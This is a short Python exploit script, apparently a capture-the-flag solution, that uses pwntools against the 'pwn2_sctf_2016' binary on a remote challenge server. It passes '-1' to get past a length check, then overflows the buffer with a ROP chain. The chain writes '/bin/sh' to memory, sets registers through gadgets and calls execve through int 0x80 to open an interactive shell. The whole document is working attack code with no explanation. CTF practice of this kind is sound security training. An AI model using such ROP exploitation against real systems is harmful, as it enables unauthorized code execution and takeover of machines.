# method two

from pwn import *


p = remote("node4.buuoj.cn", 25326)
pro = ELF("./pwn2_sctf_2016")


p.sendline("-1")
p.recvuntil("bytes of data!\n")

# rop chain --> shellcode --> sys_execve
#####
int_0x80 = 0x080484D0
get_n = 0x080484E3 
bss_addr = 0x0804A045
pop_ebx_ret = 0x0804835d
inc_eax_ret = 0x080484d3
inc_ecx_ret = 0x080484d7 
pop_2_ret = 0x0804864e 
pop_1_ret = pop_2_ret+0x1 
printf = pro.plt["printf"]


pad = cyclic(0x2c+0x4)
# set bss_addr = "/bin/sh"
pad += p32(get_n)+p32(pop_2_ret)+p32(bss_addr)+p32(0x12345678)
# set ebx = "/bin/sh"
pad += p32(pop_ebx_ret)+p32(bss_addr)
# set eax = 0xb
pad += p32(printf)+p32(pop_1_ret)+p32(bss_addr)+p32(inc_eax_ret)*0x4 
# set ecx = 0x0
pad += p32(inc_ecx_ret)*0x1 
# syscall
pad += p32(int_0x80)

#####

p.sendline(pad)
p.sendline("/bin/sh")


p.interactive()

